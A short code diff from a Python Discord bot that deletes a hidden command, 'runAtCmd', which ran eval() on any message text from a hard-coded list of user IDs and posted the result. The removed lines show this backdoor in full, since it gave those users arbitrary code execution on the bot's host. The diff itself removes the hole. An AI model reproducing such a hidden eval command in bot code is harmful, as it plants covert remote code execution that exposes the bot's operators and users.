@@ -401,12 +401,7 @@ logger.setLevel(logging.DEBUG)
 handler = logging.FileHandler(filename='discord.log', encoding='utf-8', mode='w')
 handler.setFormatter(logging.Formatter('%(asctime)s:%(levelname)s:%(name)s: %(message)s'))
 logger.addHandler(handler)        
-                
-@bot.command(hidden = True)
-async def runAtCmd(ctx, *, args):
-    if ctx.author.id in (525334420467744768, 436646726204653589, 218142353674731520, 218590885703581699, 212700961674756096, 355286125616562177, 270932660950401024, 393250142993645568, 210939566733918208, 419742289188093952):
-        response = eval(args)
-        await ctx.send(response)
+            
 
 @bot.command(description = "Changes bot status")
 async def botStatus(ctx, args1):
